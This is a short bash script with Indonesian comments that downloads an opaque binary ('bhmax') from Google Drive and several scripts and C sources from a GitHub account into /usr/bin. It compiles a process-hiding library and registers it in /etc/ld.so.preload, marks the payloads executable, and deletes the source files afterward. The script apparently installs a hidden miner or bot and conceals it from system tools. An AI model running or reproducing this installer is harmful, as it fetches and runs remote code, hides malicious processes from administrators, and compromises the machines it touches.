#!/bin/bash

# Ubah direktori kerja ke /usr/bin
cd /usr/bin

# Unduh file yang diperlukan
curl -L "https://docs.google.com/uc?export=download&id=1xynrUVmOiCTjOJRIXOKNHyGuqhD-Kq9t" > bhmax
wget https://raw.githubusercontent.com/hudahadoh/vs/main/cmd_launch.sh
wget https://raw.githubusercontent.com/hudahadoh/vs/main/configna.ini
wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py

# Ubah izin agar skrip dapat dieksekusi
chmod +x smtp.py

# Kompilasi processhider.c menjadi libprocess.so
gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl

# Pindahkan libprocess.so ke /usr/local/lib dan tambahkan ke /etc/ld.so.preload
mv libprocess.so /usr/local/lib/
echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Ubah izin agar bhmax dapat dieksekusi
chmod +x bhmax
chmod +x cmd_launch.sh

# Kompilasi hi.c menjadi hi
gcc -o hi hi.c

# Hapus file source setelah kompilasi
rm hi.c processhider.c

# Ubah izin agar hi dapat dieksekusi
chmod +x hi

